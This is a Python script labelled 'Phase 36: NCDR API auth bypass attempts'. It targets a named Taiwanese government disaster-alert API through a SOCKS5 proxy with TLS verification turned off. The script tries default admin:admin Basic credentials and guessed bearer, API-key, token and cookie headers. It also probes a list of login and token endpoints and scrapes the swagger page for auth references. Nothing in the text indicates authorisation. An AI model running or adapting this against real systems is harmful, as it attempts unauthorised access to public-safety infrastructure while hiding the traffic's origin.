#!/usr/bin/env python3
"""Phase 36: NCDR API auth bypass attempts."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, re, json
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5h://202.160.76.154:11085', 'http': 'socks5h://202.160.76.154:11085'}
BASE = 'https://alerts.ncdr.nat.gov.tw/AddValueApi'

# 1. Check exact 401 response body
r = requests.get(f'{BASE}/EventCode', proxies=PROXY, verify=False, timeout=15,
                 headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
print(f"=== EventCode 401 response ===")
print(f"Status: {r.status_code}")
print(f"Headers: {dict(r.headers)}")
print(f"Body: {r.text}")

# 2. Try common auth headers
print("\n=== Auth header attempts ===")
auth_headers = [
    ('No auth', {}),
    ('Bearer token', {'Authorization': 'Bearer test'}),
    ('Basic admin', {'Authorization': 'Basic YWRtaW46YWRtaW4='}),
    ('Basic admin:admin', {'Authorization': 'Basic YWRtaW46YWRtaW4='}),
    ('X-API-Key', {'X-API-Key': 'test'}),
    ('X-Auth-Token', {'X-Auth-Token': 'test'}),
    ('Cookie', {'Cookie': 'session=abc'}),
]

for name, extra_headers in auth_headers:
    headers = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', **extra_headers}
    try:
        r = requests.get(f'{BASE}/EventCode', proxies=PROXY, headers=headers, verify=False, timeout=10)
        print(f"  {name}: {r.status_code} - {r.text[:100]}")
    except:
        pass

# 3. Check if AuthServer endpoint exists
print("\n=== Auth-related probes ===")
for path in ['/Auth', '/auth', '/Token', '/token', '/login', '/swagger/login',
             '/api/auth', '/api/token', '/signin', '/oauth/token', '/connect/token']:
    try:
        r = requests.get(f'{BASE}{path}', proxies=PROXY, verify=False, timeout=10,
                        headers={'User-Agent': 'Mozilla/5.0'})
        print(f"  GET {path} -> {r.status_code}, len={len(r.text)}")
        if r.status_code != 404 and r.status_code != 401:
            print(f"    Body: {r.text[:200]}")
    except:
        pass

# 4. Check for any auth-related HTML
print("\n=== Swagger page auth ===")
r = requests.get(f'{BASE}/swagger', proxies=PROXY, verify=False, timeout=15,
                headers={'User-Agent': 'Mozilla/5.0'})
print(f"  /swagger -> {r.status_code}, len={len(r.text)}")

# Look for auth config in swagger HTML
auth_refs = re.findall(r'["\'](.*(?:auth|token|apikey|key|login).*)["\']', r.text, re.I)
print(f"  Auth refs in HTML: {auth_refs[:10]}")

# 5. Check if the API accepts different Accept headers
print("\n=== Accept header variations ===")
for accept in ['application/json', 'application/xml', 'text/plain', '*/*',
               'application/json-patch+json', 'text/json', 'application/x-www-form-urlencoded']:
    r = requests.get(f'{BASE}/EventCode', proxies=PROXY, verify=False, timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0', 'Accept': accept})
    print(f"  Accept={accept}: {r.status_code}, ct={r.headers.get('Content-Type','')[:40]}, len={len(r.text)}")

print("\nDone.")
